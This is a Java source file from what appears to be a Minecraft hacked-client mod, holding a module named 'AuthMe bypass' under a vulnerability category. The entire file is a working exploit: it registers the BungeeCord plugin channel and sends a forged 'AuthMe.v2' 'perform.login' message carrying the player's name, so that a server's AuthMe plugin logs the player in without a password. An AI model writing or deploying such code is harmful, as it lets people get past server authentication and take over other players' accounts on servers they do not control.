package moe.badcat.module.modules;

import moe.badcat.module.BaseModule;
import io.netty.buffer.Unpooled;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import net.minecraft.client.Minecraft;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.CPacketCustomPayload;

public class ModuleAuthMeBypass extends BaseModule {
    public ModuleAuthMeBypass() {
        super("漏洞类", "AuthMe绕过");
    }

    @Override
    public void onUse() {
        try {
            PacketBuffer buffer1 = new PacketBuffer(Unpooled.buffer());
            buffer1.writeString("BungeeCord");
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketCustomPayload("REGISTER", buffer1));

            ByteArrayOutputStream buffer2 = new ByteArrayOutputStream();
            DataOutputStream out = new DataOutputStream(buffer2);
            out.writeUTF("AuthMe.v2");
            out.writeUTF("perform.login");
            out.writeUTF(Minecraft.getMinecraft().player.getName());

            PacketBuffer buffer3 = new PacketBuffer(Unpooled.buffer());
            buffer3.writeBytes(buffer2.toByteArray());
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketCustomPayload("BungeeCord", buffer3));
        } catch (Exception e) {
            if (ModuleDebug.enable) e.printStackTrace();
        }
    }
}
